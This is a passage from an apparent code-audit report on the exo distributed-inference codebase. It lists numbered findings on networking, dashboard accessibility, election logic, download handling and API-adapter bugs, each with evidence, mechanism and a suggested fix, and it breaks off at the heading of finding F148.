**Evidence.** lib.rs:35 `cfg.insert_json5("adminspace/enabled", "true")?;` and lib.rs:39-50 declare `plugins/storage_manager/__required__` plus a memory storage on `storage/mem1/**` with `replication: { interval: 2 }`; lib.rs:66-67 statically links StoragesPlugin. A repo-wide grep for `mem1`, `storage/`, `adminspace`, or `@/` in src/, dashboard/src and docs returns nothing. The vendored storage manager spawns a digest publisher per replicated storage (replication/core.rs:123, `spawn_digest_publisher`) that publishes `@-digest/<zid>/<hash>` every `interval`. This forces `features = ["internal", "plugins", "unstable"]` on zenoh and the `zenoh-plugin-storage-manager` / `zenoh-plugin-trait` crates into the build (rust/networking/Cargo.toml:12-14), and requires the hand-rolled RuntimeBuilder/session::init/start sequence instead of `zenoh::open`.

**Mechanism.** Every node runs an aligner queryable, a digest subscriber and a 2 s digest publisher for an always-empty store, adding periodic mesh traffic and extra tasks per node for no consumer; adminspace exposes `@/<zid>/router/config/**` and linkstate to any mesh member. Maintainers must also carry a git-pinned zenoh fork with plugin features for code that has no caller (introduced wholesale in 09f9ea3 with no follow-up use).

**Fix.** Delete lib.rs:35 and 39-50, drop the PluginsManager/RuntimeBuilder path (lib.rs:66-73) in favour of `zenoh::open(cfg).await?`, remove `zenoh-plugin-storage-manager`/`zenoh-plugin-trait` and the `plugins`/`internal` features from rust/networking/Cargo.toml and the workspace Cargo.toml. If adminspace is wanted for `z_get '@/**'` debugging, gate it behind an env var.

### F126 — todo!/expect/assert inside pymethods surface as PanicException instead of Python errors

*`rust/exo_rs/src/networking.rs:75` — low · effort S · finder-reported · lens `rust-transport` · confidence 0.85*

**Evidence.** networking.rs:74-76: `if listen_port == 0 { todo!("cannot listen on port 0 yet"); }` runs before validation. discovery.rs:105-106 `.expect("failed to bind discovery watcher")` panics inside the `block_on` in `new` when netwatcher cannot open its netlink/route socket. swarm.rs:146 `assert!(topic.is_ascii());` runs inside the spawned stream task, and lib.rs:24-26 asserts again on identity/port. No Python code catches PanicException (grep of src/ is empty).

**Mechanism.** `uv run exo --zenoh-port 0` aborts with a Rust backtrace and `pyo3_runtime.PanicException`, which derives from BaseException and bypasses `except Exception` handlers (e.g. main.py's error paths). A sandbox or container where netwatcher cannot bind produces the same crash with no actionable message. A panic in the stream task leaves the pending `recv()` future unresolved because JoinHandle errors are not observed.

**Fix.** Return `PyValueError` for port 0 (or support ephemeral ports by reading `session.z.info().locators()`), map the netwatcher error with `.map_err(io::Error::other)?` and propagate through `?`, and turn the `is_ascii` assert into `Err("topic must be ASCII")` via result_sender. Add `#[pyclass(frozen)]` to NetworkingHandle while touching it.

### F127 — Keyboard/AT users cannot reach message actions or the model picker: hover-only action bar, icon-only buttons without aria-label, click-only images, dialog with no focus management

*`dashboard/src/lib/components/ChatMessages.svelte:644` — low · effort S · finder-reported · lens `dashboard` · confidence 0.85*

**Evidence.** Action bar: `class="flex items-center gap-1 mt-1.5 opacity-0 group-hover:opacity-100 ..."` (643-648) — no `group-focus-within:opacity-100`, so focused buttons are invisible. Copy/Edit/Heatmap/Regenerate/Delete buttons use `title` only (650-654, 688-692, 711-721, 740-744, 762-771). Images are `<img onclick=...>` with `<!-- svelte-ignore a11y_no_noninteractive_element_interactions, a11y_click_events_have_key_events -->` (403-412, 488-497). ModelPickerModal: `role="dialog" aria-modal="true"` (678-684) but nothing moves focus into the modal or traps Tab, and `<svelte:window onkeydown={handleKeydown}>` (666, 639-643) calls `onClose()` on every Escape page-wide regardless of `isOpen`. TopologyGraph: `<svg ...></svg>` (1228) has no `role`/`aria-label`; nodes only get d3 `click`/`mouseenter` handlers (601-617).

**Mechanism.** A keyboard user tabs through the transcript and lands on invisible buttons (screen readers announce 'button' with no name); enlarging an attachment or opening the lightbox is impossible without a mouse; opening the model picker leaves focus behind the backdrop so Tab cycles through the hidden dashboard; the cluster graph is silent to assistive tech.

**Fix.** Add `group-focus-within:opacity-100` to the action bar and `aria-label` mirroring each `title`; wrap clickable images in `<button type="button">`. In ModelPickerModal, on `isOpen` focus the search input, trap Tab within the dialog, restore focus on close, and guard `handleKeydown` with `if (!isOpen) return`. Give the SVG `role="img"` and an `aria-label` summarising node count, and make nodes focusable (`tabindex=0`, Enter → `onNodeClick`).

### F128 — The end-of-round status rebroadcast is appended as a second candidate, inflating the winner's seniority beyond the cluster size

*`src/exo/shared/election.py:232` — low · effort S · finder-reported · lens `control-plane` · confidence 0.80*

**Evidence.** election.py:211 and 216 send the identical `status` object twice; `_election_receiver` line 157 appends every equal-clock message without deduplication; on a win `self.seniority = max(self.seniority, len(candidates))` (232). The second copy lands inside a peer's window whenever the peer's round started after the first copy arrived (the normal case). `test_single_round_broadcasts_and_updates_seniority_on_self_win` only injects one message so it asserts 2 and does not cover the rebroadcast.

**Mechanism.** In a two-node cluster the master ends up with seniority 3 instead of 2. Seniority is the primary ranking after clock (election.py:31-32), so when two partitions merge, the master of the smaller partition can outrank the master of the larger one; the larger group then changes master, which rebuilds every EventRouter/Worker and drops all its placed instances for no benefit.

**Fix.** Keep candidates as `dict[NodeId, ElectionMessage]` keyed by `proposed_session.master_node_id` (last write wins) and use `len(candidates)` of distinct nodes; add a test that the rebroadcast does not raise seniority above the participant count.

### F129 — Cancelled generation tasks never leave the supervisor's in_progress map because the runner emits no terminal status on CancelledResponse

*`src/exo/worker/runner/supervisor.py:347` — low · effort S · finder-reported · lens `worker-runner` · confidence 0.80*

**Evidence.** runner.py:347-351: `case CancelledResponse(): finished.append(task_id)` sends nothing, while `FinishedResponse` calls `send_task_status(task_id, TaskStatus.Complete)`. supervisor.py:332-348 pops `in_progress` only when `event.task_status == TaskStatus.Complete`. supervisor.py:408-423 emits a ChunkGenerated(ErrorChunk) for every remaining `in_progress` task in `_check_runner`.

**Mechanism.** Every cancelled request stays in `in_progress` for the supervisor's lifetime. On a later crash the supervisor emits ErrorChunks for long-finished commands; the API drops them (queue already deleted) but they are indexed into the master's event log and persisted, and `in_progress` grows by one entry per cancelled request.

**Fix.** Have the runner send `TaskStatusUpdated(task_id, TaskStatus.Cancelled)` (or Complete) on CancelledResponse, and have `_forward_events` pop `in_progress` on any terminal status (Complete, Cancelled, Failed, TimedOut).

### F130 — All runners append to two shared, never-rotated stdout.log/stderr.log files, so runner logs grow without bound and interleave across runners

*`src/exo/worker/runner/supervisor.py:88` — low · effort S · finder-reported · lens `worker-runner` · confidence 0.80*

**Evidence.** supervisor.py:82-89 opens `EXO_RUNNER_STDOUT_LOG`/`EXO_RUNNER_STDERR_LOG` with `anyio.open_file(..., "a")` per supervisor; constants.py:72-73 define them as single fixed paths (`runner_log/stdout.log`, `runner_log/stderr.log`); 154-155 `await logfile.write(text); await logfile.flush()` for every chunk; the only rotation in the codebase is for exo.log (logging.py:76-83). The comment (82-85) says the files exist for log template mining.

**Mechanism.** Every line of every runner's stdout/stderr (including the child's loguru output) is mirrored forever; with several runners per node the lines interleave with no runner id, defeating the stated mining purpose. Over weeks the files reach GBs, and once the disk fills the OSError at line 154 escapes the supervisor and (see the isolation finding) terminates the node.

**Fix.** Open per-runner files (`runner_log/<runner_id>.stdout.log`), apply size-based rotation or a retention cap (delete files older than N days at supervisor create), and make write failures non-fatal.

### F131 — standard_yarn_rope patch is numerically identical to upstream YarnRoPE yet freezes its signature and never wires the `truncate` option it introduces

*`src/exo/worker/engines/mlx/patches/standard_yarn_rope.py:116` — low · effort S · finder-reported · lens `mlx-engine` · confidence 0.80*

**Evidence.** standard_yarn_rope.py:56-65 computes `inv_freq = inv_inter*(1-mask) + inv_extra*mask; self._freqs = 1/inv_freq`; upstream (pinned rope_utils.py:174-180) computes `_freqs = (freq_inter*freq_extra)/(freq_inter*mask + freq_extra*(1-mask))` with `freq_inter = scaling_factor*freq_extra`. Substituting `inv_x = 1/freq_x` shows the two expressions are the same rational function, so the blend is identical up to rounding. The new `truncate` parameter (22, 37-39) is never read from `scaling_config` in `_patched_initialize_rope` (84-109), so it is always `True` — exactly upstream's floor/ceil. The docstring (24) claims a vLLM-compatibility change.

**Mechanism.** The patch adds no behaviour but replaces `YarnRoPE.__init__` and `initialize_rope` wholesale (116-118), so any upstream change to YaRN (new kwargs, `telechat3-yarn`, bug fixes) is silently masked, and models whose HF config sets `"truncate": false` (some Qwen/GLM YaRN configs) still get truncated ranges — the very incompatibility the patch appears to target. Readers are misled into thinking exo's RoPE differs from mlx_lm's.

**Fix.** Either delete the patch, or reduce it to an `initialize_rope` override that reads `scaling_config.get("truncate", True)` and passes it through to the (upstream) YarnRoPE while leaving `YarnRoPE.__init__` untouched; add a tiny numeric test comparing `_freqs` against upstream for a known DeepSeek/Qwen YaRN config.

### F132 — Mp channel async helpers create a throw-away CapacityLimiter(1) per call and abandon receiving threads on cancel

*`src/exo/utils/channels.py:350` — low · effort S · finder-reported · lens `concurrency` · confidence 0.80*

**Evidence.** channels.py:269-272 `send_async`: `await to_thread.run_sync(self.send, item, limiter=CapacityLimiter(1), abandon_on_cancel=True)`; channels.py:348-351 `receive_async`: same pattern around `self.receive`. A `CapacityLimiter` constructed inside the call limits nothing (each call gets its own token) and bypasses anyio's default 40-thread limiter. `receive` (332-346) blocks in `mp.Queue.get()`; an abandoned thread that later wakes consumes and discards the item. Used by supervisor.py:294 (`start_task`), 309 (`cancel_task`, inside `move_on_after(0.5)`), and 321-322 (`async for event in events`).

**Mechanism.** Cancelling `receive_async` (supervisor shutdown, or any future timeout wrapper) leaves a worker thread blocked in `Queue.get()` that will swallow the next runner event instead of delivering it; because the limiter is per-call, repeated cancellations accumulate blocked threads rather than being serialised. Today the only consumer is torn down right after cancellation so the loss is benign, but any new timeout-based use (for example the runner-hang watchdog suggested above) would silently drop `TaskAcknowledged`/`TaskStatusUpdated` events and hang `start_task`.

**Fix.** Hold one `CapacityLimiter(1)` per `MpSender`/`MpReceiver` instance (create it lazily in `__post_init__`, exclude from `__getstate__`), and for receives prefer `abandon_on_cancel=False` with a polling `get(timeout=...)` loop that checks a cancel flag, so a cancelled `receive_async` never leaves a thread that can consume a message. Document the semantics in the class docstring.

### F133 — DownloadCoordinator treats DownloadFailed as terminal, so the dashboard's Retry button and the worker's re-request are no-ops; recovery only happens by accident when the 60 s rescan overwrites the status

*`src/exo/download/coordinator.py:203` — low · effort S · finder-reported · lens `resilience` · confidence 0.80*

**Evidence.** coordinator.py:200-207 `_start_download`: `if isinstance(status, (DownloadOngoing, DownloadCompleted, DownloadFailed)): logger.debug(... skipping); return`. `_cancel_download` :175-176 only acts `if model_id in self.active_downloads`, which a failed download is not. The dashboard's failed cell (downloads/+page.svelte:659-666, title "Retry download on this node") calls `startDownload` → `/download/start` → `StartDownload` → that early return. plan.py:153-159 `_model_needs_download` also excludes `DownloadFailed`. The status only changes because `_emit_existing_download_progress` (:387-418) rescans every 60 s (:475), sees `downloaded_this_session.in_bytes == 0` (download_utils.py:1014 always sets 0 on a scan) and overwrites the entry with `DownloadPending`, after which the worker re-requests.

**Mechanism.** A 60 GB download fails after `download_file_with_retry`'s five attempts (HF 5xx, Wi-Fi drop). The user clicks Retry: nothing happens, no log above DEBUG. Up to a minute later the cell flips to pending and the download resumes on its own, or — if the user got impatient and clicked Delete — the partial 55 GB is thrown away and the download restarts from zero. In offline mode the same loop makes the cell flip failed→pending→failed every 60 s.

**Fix.** In `_start_download`, treat `DownloadFailed` as retryable: remove it from the skip tuple (keep `DownloadOngoing`/`DownloadCompleted`), and log at INFO that a retry was requested. Make `_cancel_download` also clear a `DownloadFailed` entry back to `DownloadPending`. Then the rescan's overwrite becomes a harmless fallback rather than the only recovery path, and explicit retries work immediately without deleting partial files.

### F134 — net_profile reachability client is created with verify=False, a TLS-verification landmine on a probe that also trusts peer-advertised IPs

*`src/exo/utils/info_gatherer/net_profile.py:113` — low · effort S · finder-reported · lens `security` · confidence 0.80*

**Evidence.** `check_reachable` (net_profile.py:84-127) opens `httpx.AsyncClient(timeout=timeout, limits=limits, verify=False)` (113) and, for every node in the topology, probes every `iface.ip_address` from `node_network[node_id].interfaces` (117-123) — data that peers self-report via `NodeNetworkInterfaces` gathered info. `check_reachability` (17-73) only ever builds `http://` URLs (26-28), so `verify=False` is currently a no-op; the response is compared to the expected node id and the IP is stored as reachable (71-73).

**Mechanism.** `verify=False` disables certificate checking for any future `https://` use of this client (e.g. if the API gains TLS), silently. Separately, a peer can advertise arbitrary addresses (RFC1918 ranges, cloud metadata, other hosts) and every node will issue `GET /node_id` to them three times every profile cycle — a low-impact but unbounded SSRF/port-probe primitive that also inflates topology probing time.

**Fix.** Drop `verify=False` (use the default). Restrict probed addresses to the peer's own IPv4/IPv6 unicast address families and skip loopback/multicast/reserved ranges (`ipaddress` checks) before scheduling `_probe`. Cap the number of interfaces probed per node.

### F135 — Dashboard polls GET /state every second and the server re-serialises the entire State (with duplicated ModelCards and per-file download maps) with no change detection

*`src/exo/api/main.py:413` — low · effort S · finder-reported · lens `performance` · confidence 0.80*

**Evidence.** api/main.py:397-398 routes `/state` and `/state/{path}` to `get_state`, which returns `self.state` (413) for the root path; no ETag/If-None-Match or `since` parameter, and `path` lookups do a full `self.state.model_dump(by_alias=True)` (415). app.svelte.ts:1287 `setInterval(() => this.fetchState(), 1000)`; 1308-1359 re-parses the JSON, re-runs `transformTopology` (1317) and reassigns every store field on every tick regardless of change. State embeds a full `ModelCard` in every `DownloadProgress.shard_metadata` (downloads.py:26-28) and every `ShardMetadata` in `runner_to_shard`, and `DownloadOngoing.download_progress.files` holds a `DownloadProgressData` per weight file (downloads.py:12-23, 47).

**Mechanism.** Per open dashboard tab the node does one full pydantic-&gt;JSON encode of the cluster state per second (FastAPI's jsonable_encoder walks the resulting dict in pure Python) and the browser re-parses and re-renders it; payload is O(nodes x models x files) and easily tens to hundreds of KB during multi-node downloads. Several tabs or a monitoring script multiply it, and it competes with token streaming on the same loop. `state.last_event_applied_idx` already provides a free monotonic version that is never used.

**Fix.** Return `state.last_event_applied_idx` as an ETag (and accept `If-None-Match` -&gt; 304) or a `?since=` query that short-circuits when unchanged; cache the encoded JSON bytes per idx so concurrent pollers share one encode. Longer term expose an SSE stream of IndexedEvents and let the dashboard apply deltas.

### F136 — Ollama error frames drop the error text and use a non-Ollama done_reason instead of {"error": ...}

*`src/exo/api/adapters/ollama.py:385` — low · effort S · finder-reported · lens `api-compat` · confidence 0.80*

**Evidence.** generate_ollama_generate_stream on ErrorChunk emits `OllamaGenerateResponse(model=..., response="", done=True, done_reason="error")` (ollama.py:385-393) — `chunk.error_message` is never used. generate_ollama_chat_stream puts the message into `message.content` with `done_reason="error"` (197-207). `OllamaDoneReason = Literal["stop","length","tool_call","error"]` (ollama_api.py:13) invents "error". Ollama's wire protocol reports failures as a JSON object with an `error` key (streamed line or HTTP 4xx/5xx body), and its done_reason values are stop/length/load/unload.

**Mechanism.** ollama-python, the Ollama CLI and Open WebUI check for an `error` key; against exo a failed /api/generate stream looks like a successful empty completion (no error text anywhere), and a failed /api/chat stream renders the error string as if the assistant had said it. Neither path raises a client-side exception.

**Fix.** On ErrorChunk yield `json.dumps({"error": chunk.error_message}) + "\n"` and return (both stream generators); for the non-streaming collectors raise HTTPException(500) and have the exception handler emit `{"error": message}` for /ollama/* paths. Remove "error" from OllamaDoneReason.

### F137 — Publishing to a topic that is not yet declared silently succeeds; docstrings promise an exception that does not exist

*`rust/networking/src/swarm.rs:125` — low · effort S · finder-reported · lens `rust-transport` · confidence 0.80*

**Evidence.** swarm.rs:121-127: `let res = match topics.get(&topic) { Some(topic) => topic.1.put(data).await, None => { // TODO: this should be an error ... Ok(()) } };` The Python docstring (networking.rs:165-167, exo_rs.pyi:51-56) says "If no peers are found that subscribe to this topic, throws `NoPeersSubscribedToTopicError` exception"; no such type exists anywhere. Router.run (router.py:158-166) starts `_networking_publish` before it awaits `_networking_subscribe` for each topic, and Election.run (election.py:93-98) campaigns immediately on start.

**Mechanism.** Messages handed to gossipsub_publish in the window before the publisher for that topic is declared (startup, or after an unsubscribe/re-subscribe) are discarded while the caller sees success and nothing is logged. Today this only costs an election round at boot, but any future topic registered after Router.run (register_topic supports that, router.py:123-132) would lose its first messages invisibly.

**Fix.** Return `Err(zenoh::Error::from("not subscribed to topic"))` as the TODO says (Python's `_networking_publish` already propagates), or lazily declare the publisher on first Publish. Fix both docstrings and regenerate exo_rs.pyi.

### F138 — Global `[tool.uv] prerelease = "allow"` admits release candidates of unrelated packages into the lock

*`pyproject.toml:187` — low · effort S · finder-reported · lens `build-deps` · confidence 0.80*

**Evidence.** pyproject.toml:185-188 `[tool.uv] required-version = ">=0.8.6"; prerelease = "allow"`. uv.lock contains `packaging 26.0rc1`, `kiwisolver 1.4.10rc0`, `nodejs-wheel-binaries 25.2.1rc0` — none of which are requested as pre-releases anywhere in pyproject.toml (grep for `rc`/`dev` specifiers finds none).

**Mechanism.** With the policy set globally, every `uv lock`/`uv lock --upgrade` may select any pre-release that satisfies a range, so the lock silently picks up RCs of core tooling (`packaging` is used by setuptools, pip, uv_build and PyInstaller's own version parsing). An RC regression shows up as a build/type failure unrelated to the change being made, and the setting hides which package actually needed the exemption (presumably the fork's `mlx 0.32.0.dev20260506` on Darwin, which as a direct git source does not need it).

**Fix.** Remove `prerelease = "allow"`; if a specific dependency truly needs a pre-release, express it in that requirement (`pkg>=1.2.0rc1`) or via `[tool.uv] prerelease = "if-necessary-or-explicit"` (the default) so only explicitly named pre-releases are considered. Re-lock and confirm `packaging`/`kiwisolver`/`nodejs-wheel-binaries` fall back to stable releases.

### F139 — download_shard spawns an unreferenced asyncio task per 8 MiB chunk that rebuilds the whole RepoDownloadProgress and fans out to every callback

*`src/exo/download/download_utils.py:1030` — low · effort S · finder-reported · lens `performance` · confidence 0.75*

**Evidence.** download_utils.py:738-740: `on_progress(n_read, length, False)` after every `r.content.read(8 * 1024 * 1024)`. 1027-1032 `schedule_progress` does `asyncio.create_task(on_progress_wrapper(...))` without keeping a reference. 949-1005 `on_progress_wrapper` builds a new `RepoFileDownloadProgress` and calls `calculate_repo_progress` (759-805), which iterates `file_progress` five times and constructs a `RepoDownloadProgress` carrying the full per-file dict, then awaits every registered callback (impl_shard_downloader.py:103-107). The coordinator only throttles the *event* it emits to 1/s per model (coordinator.py:92-132) after all of this work has been done.

**Mechanism.** With 8 concurrent files at a few hundred MB/s aggregate, dozens of tasks per second are created, each O(number of files) Python work plus pydantic construction, on the same loop that serves tokens; if callbacks are slower than chunk arrival the task set grows without bound (backpressure is absent because tasks are fire-and-forget), and per the asyncio docs unreferenced tasks may be garbage-collected mid-flight, which can lose the `is_renamed=True` 'complete' transition for a file until the final aggregate at 1052-1055.

**Fix.** Throttle at the source: in `download_shard`, coalesce progress per file to at most one callback per ~250 ms (always delivering `is_renamed=True`), keep the created tasks in a `set` (discard on done) or simply `await` the wrapper inline behind the throttle, and maintain the repo aggregates incrementally instead of recomputing in `calculate_repo_progress`.

### F140 — Chat/Ollama streams end with no terminal frame when the channel closes without a finish_reason

*`src/exo/api/adapters/chat_completions.py:227` — low · effort S · finder-reported · lens `api-compat` · confidence 0.75*

**Evidence.** generate_chat_stream only emits `data: [DONE]` inside the ErrorChunk/ToolCallChunk/finish_reason branches (chat_completions.py:242, 275, 291); when `chunk_stream` simply ends the function returns with nothing else written. _token_chunk_stream ends without a finish when the Sender is closed by _close_streams_for_instance (main.py:2007-2010) on InstanceDeleted or by cancel_command (750). generate_ollama_chat_stream / generate_ollama_generate_stream (ollama.py:192-263, 380-441) likewise never emit a `done: true` line in that case. Claude and Responses streams do fall through to terminal events but with `stop_reason: null` / `status: "completed"` and empty content (claude.py:481-490, responses.py:810-821).

**Mechanism.** If the instance is deleted (or another client cancels the command) mid-generation, an OpenAI SDK consumer sees the SSE connection close with no `[DONE]` and no error frame; an Ollama client sees NDJSON EOF with `done: false` on the last line. Both are indistinguishable from a network drop, so the partial text is treated as a successful answer or the client retries the whole prompt.

**Fix.** Track `saw_finish` in each stream generator; after the loop, if it is False emit an explicit error frame (OpenAI: `{"error":{"message":"generation aborted","type":"server_error","code":503}}` then `[DONE]`; Ollama: `{"error": ...}`; Claude: `event: error`; Responses: `response.failed`) so clients can distinguish abort from completion.

### F141 — Demoting a master zstd-compresses the entire session log synchronously on the event loop, stalling election and event handling for the duration

*`src/exo/master/main.py:162` — low · effort S · finder-reported · lens `control-plane` · confidence 0.70*

**Evidence.** master/main.py:150-165: `Master.run`'s `finally` calls `self._event_log.close()`. disk_event_log.py:153-161 `close()` -&gt; `_rotate(...)` -&gt; `zstandard.ZstdCompressor().copy_stream(f_in, f_out)` runs inline in the coroutine with no `to_thread`. The same rotation runs in `DiskEventLog.__init__` (79-81) when a new Master is constructed synchronously inside `Node._elect_loop` (main.py:218-228). Event volume: ~90k events/node/day at 1 Hz telemetry (info_gatherer.py:444-456), each a multi-KB MacmonMetrics record.

**Mechanism.** When a long-running master is demoted (or a node with a stale multi-hundred-MB `events.bin` is promoted), the whole process — Router pumps, Election receivers, the new EventRouter — is blocked for the compression time (seconds for a GB-scale log). Election messages and connection events queued during the stall are processed late; if the stall exceeds the 3 s round window, the node misses the round and the rest of the cluster concludes it without this node's vote, feeding the split-brain and re-election churn described above.

**Fix.** Perform rotation off the event loop (`await anyio.to_thread.run_sync(self._rotate, ...)` from an async `aclose()`, or spawn it via the Node task group), and make `DiskEventLog.__init__` rename the stale file instantly and compress it lazily in the background. Add a test with a large synthetic log asserting `close()` returns within a bound.

### F142 — Claude streaming reports input_tokens=0 and message_delta omits input_tokens

*`src/exo/api/adapters/claude.py:358` — low · effort S · finder-reported · lens `api-compat` · confidence 0.70*

**Evidence.** generate_claude_stream builds `ClaudeMessageStart(... usage=ClaudeUsage(input_tokens=0, output_tokens=0))` at claude.py:353-359 and at 481-486 emits `ClaudeMessageDeltaUsage(output_tokens=output_tokens)`; `ClaudeMessageDeltaUsage` (claude_api.py:207-210) has only `output_tokens`. `last_usage.prompt_tokens` is available at 461-462 but only `completion_tokens` is used. The non-streaming path does report it (`input_tokens = last_usage.prompt_tokens` at claude.py:328).

**Mechanism.** Claude Code, the Anthropic SDK's usage accumulator and cost dashboards sum `message_start.usage.input_tokens` (+ the optional `input_tokens` on message_delta). Against exo every streamed request reports 0 input tokens, so context-window meters and auto-compaction heuristics based on usage never trigger, and non-streaming vs streaming calls disagree for the same prompt.

**Fix.** Extend ClaudeMessageDeltaUsage with `input_tokens: int | None = None` (Anthropic's MessageDeltaUsage allows it, plus cache_creation/read fields as None) and populate `input_tokens=last_usage.prompt_tokens` in the message_delta event; alternatively buffer the first usage-bearing chunk before emitting message_start so message_start carries the real prompt count.

### F143 — HTTP session ignores lowercase proxy variables and NO_PROXY, and the HF token file is re-read on every request

*`src/exo/download/download_utils.py:557` — low · effort S · finder-reported · lens `download` · confidence 0.70*

**Evidence.** download_utils.py:554-564: `aiohttp.ClientSession(... proxy=os.getenv("HTTPS_PROXY") or os.getenv("HTTP_PROXY") or None, ...)` with `trust_env` left at its aiohttp default False (aiohttp/client.py:300). huggingface_utils.py:70-80 `get_hf_token` does `aios.path.exists(token_path)` + `aiofiles.open(token_path)` each call; it is invoked via `get_download_headers()` at download_utils.py:496, 586, 714 and again in `_build_auth_error_message` :91 — i.e. two to three token-file reads per file downloaded, ~1500 for a 500-file repo.

**Mechanism.** On a corporate host where only `https_proxy=...` (lowercase, the form curl/pip/requests honour) is exported, `add_custom_model` works (huggingface_hub uses requests, which reads lowercase) but every weight download fails with a connection error shown only as 'Download failed'. With `NO_PROXY=hf-mirror.internal` set for an on-prem HF_ENDPOINT, exo routes mirror traffic through the proxy anyway. The per-request token-file read is wasted I/O on the event loop's thread pool during the hottest part of a download.

**Fix.** Create the session with `trust_env=True` and drop the manual `proxy=` argument (aiohttp then honours HTTP(S)_PROXY in both cases, NO_PROXY and .netrc). Resolve the token once per `download_shard`/`fetch_file_list` call (pass headers down) or memoise `get_hf_token` with a short TTL keyed on the token file's mtime.

### F144 — devShell's editable venv resolves `exo` under `$REPO_ROOT`, but no shellHook or .envrc exports REPO_ROOT

*`python/parts.nix:190` — low · effort S · finder-reported · lens `build-deps` · confidence 0.70*

**Evidence.** python/parts.nix:188-192 `editableOverlay = workspace.mkEditablePyprojectOverlay { root = "$REPO_ROOT"; members = [ "exo" "exo-bench" ]; }`; :227 the devShell's `evenv` is built from `pythonSet.overrideScope editableOverlay`. flake.nix:140-179 devShell `shellHook` only exports LD_LIBRARY_PATH (:173-178); `.envrc` is `use flake`. `grep -rn REPO_ROOT` finds only python/parts.nix:190. uv2nix's own hello-world template pairs `root = "$REPO_ROOT";` with `shellHook = ''unset PYTHONPATH; export REPO_ROOT=$(git rev-parse --show-toplevel)''` (templates/hello-world/flake.nix:44-46, 85-88 at the locked uv2nix rev); uv2nix documents the root as an environment variable expanded at runtime.

**Mechanism.** Inside `nix develop`, the `exo-evenv` python has `exo`/`exo-bench` registered at `$REPO_ROOT/src`, which expands to `/src` when the variable is unset: `python -c 'import exo'`, `python -m exo`, or any tool that imports the package through the nix venv fails with ModuleNotFoundError, while `basedpyright` (which resolves from source files) keeps working, masking the breakage. Developers fall back to `uv run` and the nix editable environment silently stops being the tested path.

**Fix.** In flake.nix devShell `shellHook`, add `unset PYTHONPATH` and `export REPO_ROOT="$(git rev-parse --show-toplevel)"` (fallback to `$PWD` when not in a git checkout), matching the uv2nix template; add a `checks.devshell-import` that runs `python -c 'import exo'` from the evenv with REPO_ROOT set to the source path.

### F145 — Two cards sharing a vision weights_repo can download the same repo concurrently into the same directory with no locking on .partial files

*`src/exo/download/impl_shard_downloader.py:142` — low · effort M · finder-reported · lens `download` · confidence 0.60*

**Evidence.** impl_shard_downloader.py:142-156: after the main repo, `ensure_shard` calls `download_shard(vision_shard, ...)` where `vision_shard` is built from `shard.model_card.vision.weights_repo`; coordinator.py:201-207 dedups only by the *main* `model_id`, and SingletonShardDownloader :62,73 keys by the main ShardMetadata. resources/inference_model_cards/mlx-community--Kimi-K2.6-mlx-DQ3_K_M-q8.toml:20 and moonshotai--Kimi-K2.6.toml:20 both declare `weights_repo = "exolabs/Kimi-K2.6-vision"`. download_utils.py:735-739 opens `partial_path` with `"ab" if resume_byte_pos else "wb"` — no O_EXCL, no lock, and :746-750 unlinks the partial on hash mismatch while the other writer may still hold it open.

**Mechanism.** User starts downloads of both Kimi-K2.6 variants on one node (or re-triggers them when the main repos are present but the vision sibling is not, which `is_model_directory_complete` :345-356 reports as incomplete). Both tasks reach `download_shard(exolabs/Kimi-K2.6-vision)` and write the same `.partial` files: interleaved chunks corrupt the file, one task's sha256 check deletes the partial while the other is appending to the unlinked inode, its `aios.rename` then raises FileNotFoundError, and both go through 5 retries. It self-heals eventually but can end in DownloadFailed and doubles the bandwidth.

**Fix.** Dedup at the repo level: keep a per-repo `asyncio.Lock`/in-flight task map in ResumableShardDownloader keyed by `ModelId` (covering both main and vision repos) so a second caller awaits the in-flight download instead of starting another. Defensively, open partials with exclusive create (`os.O_CREAT|os.O_EXCL` for a fresh write) or a per-file lock file so a second writer fails fast rather than corrupting.

### F146 — EventRouter._ingest registers the out_for_delivery entry after the send checkpoint, so an ack that arrives during the yield is lost and the event is retried for the session lifetime

*`src/exo/routing/event_router.py:114` — low · effort S · finder-reported · lens `control-plane` · confidence 0.50*

**Evidence.** event_router.py:113-114: `await self.external_outbound.send(f_ev)` then `self.out_for_delivery[event.event_id] = (anyio.current_time(), f_ev)`. anyio 4.11 `MemoryObjectSendStream.send` performs a checkpoint before enqueueing, so `_run_ext_in` can run between the two lines; its ack path (127-128) only pops an entry that already exists, and `_simple_retry` (76-84) resends anything older than 5 s indefinitely.

**Mechanism.** Most likely on the master node itself, where LOCAL_EVENTS -&gt; Master -&gt; GLOBAL_EVENTS -&gt; `_run_ext_in` is entirely in-process and fast: the echo is processed before the entry is registered, the entry is then added and never removed, and the event is re-published every ~6 s until the next election rebuilds the router. The master drops the duplicates (`idx < next_idx_to_release`), so the cost is bandwidth and log noise rather than corruption.

**Fix.** Register the entry before awaiting the send (assign, then `await send`), or record it in the same synchronous block; add a test that acks an event immediately after send and asserts `out_for_delivery` is empty.

### F147 — cancel_task escalates a &gt;0.5 s IPC send into runner termination, so scheduling jitter can kill a healthy runner and cascade sibling reloads

*`src/exo/worker/runner/supervisor.py:317` — low · effort S · finder-reported · lens `worker-runner` · confidence 0.50*

**Evidence.** supervisor.py:307-317: `with anyio.move_on_after(0.5) as scope: await self._cancel_sender.send_async(task_id) ... if scope.cancel_called: logger.error('RunnerSupervisor cancel pipe blocked'); await self._check_runner(TimeoutError('cancel pipe blocked'))`. `_check_runner` (370-373) stops a live process and publishes `RunnerFailed` (426-435). `send_async` (channels.py:269-272) is a `to_thread.run_sync` hop with `abandon_on_cancel=True` onto an unbounded `mp.Queue` (`mp_channel` default `inf` → `mp.Queue(0)`, 223-231, 446-456).

**Mechanism.** Because the queue is unbounded, the only way to exceed 0.5 s is event-loop or thread-dispatch latency (a long synchronous `apply()` deep-copying the topology on NodeTimedOut, a large `plan()` over accumulated tasks, thread-pool contention). When it happens the supervisor SIGTERMs a runner that is mid-generation, publishes RunnerFailed, and plan.py:94-100 makes every sibling rank shut down and reload the model — a multi-minute outage caused by jitter, not runner health, and the only 'timeout' in the supervisor is this misdirected one.

**Fix.** Downgrade the escalation to a warning (and retry the send) and rely on a heartbeat-based watchdog in `_watch_runner` for actual wedge detection; if a bound is wanted here, make it generous (seconds) and only mark failed when the process is also not making progress.

### F148 — AsyncProcess termination runs an unbounded kill loop inside a shielded scope, so an unkillable child blocks node shutdown forever

*`src/exo/utils/async_process.py:236` — low · effort S · finder-reported · lens `concurrency` · confidence 0.50*

